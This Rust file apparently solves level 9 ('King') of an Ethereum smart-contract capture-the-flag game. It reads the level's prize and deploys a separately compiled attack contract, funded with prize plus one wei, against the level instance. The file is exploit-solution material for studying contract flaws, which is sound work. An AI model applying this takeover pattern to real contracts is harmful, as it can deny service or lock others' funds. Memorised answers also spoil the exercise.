use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use ethers::utils::{compile, Solc};
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function prize() public returns (uint256)
    ]"#,
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let level_contract = LevelContract::new(level.instance.parse::<Address>()?, client.clone());
    let prize = level_contract.prize().call().await?;
    println!("prize: {}", prize);

    let compiled = compile(Solc::new("./contracts/09_king/solution.sol")).await?;
    let solution_contract = compiled
        .get("Solution")
        .expect("could not find solution contract");
    let factory = ContractFactory::new(
        solution_contract.abi.clone(),
        solution_contract.bytecode.clone(),
        client.clone(),
    );
    println!("Deploying solution contract");
    let mut deployer = factory.deploy(level.instance.parse::<Address>()?)?.legacy();
    deployer.tx.set_value(prize + 1);
    let solution_contract = deployer.send().await?;
    println!(
        "Solution contract deployed at {}\n",
        solution_contract.address()
    );

    Ok(())
}
